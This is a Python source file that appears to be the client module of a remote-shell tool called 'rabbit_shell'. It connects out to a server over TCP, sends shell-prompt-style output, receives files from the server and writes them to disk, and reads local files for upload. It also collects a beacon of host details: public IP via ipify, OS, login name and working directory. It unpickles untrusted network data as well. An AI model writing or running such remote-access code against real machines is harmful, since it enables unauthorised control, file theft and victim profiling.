import pickle
import os
import socket, sys
from rabbit_shell.data import data, basic
class client_side:


    def formate_socket(self):

        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)



    def connect(self, server, host: str, port: int):

        return server.connect((str(host), int(port)))

    def filetrans_recv(self, response):

        filename, data = pickle.loads(response)
        with open(filename, "wb") as file:
            file.write(data)
            file.close()
        return True

    def filetrans_readprocess(self, filename, buffer):
        file = open(filename, "rb")
        bytes = file.read(buffer)
        ls = [filename, bytes]
        data = pickle.dumps(ls)
        file.close()
        return data

    def send(self, server, data):

        ls = [os.getcwd() + ">", data]
        data = pickle.dumps(ls)

        return server.send(data)

    def logdata(self):




        def dummy_request(url=data.API_LINK["ipify"]):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((url, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost:{url}\r\n\r\n".encode())
            response = sock.recv(4096)
            sock.close()
            return response.decode().split()[-1:][0]

        dt = {
            "key": basic.KEY,
            "os": sys.platform,
            "ip": dummy_request(),
            "name": os.getlogin(),
            "path": os.getcwd()
        }

        return pickle.dumps(dt)



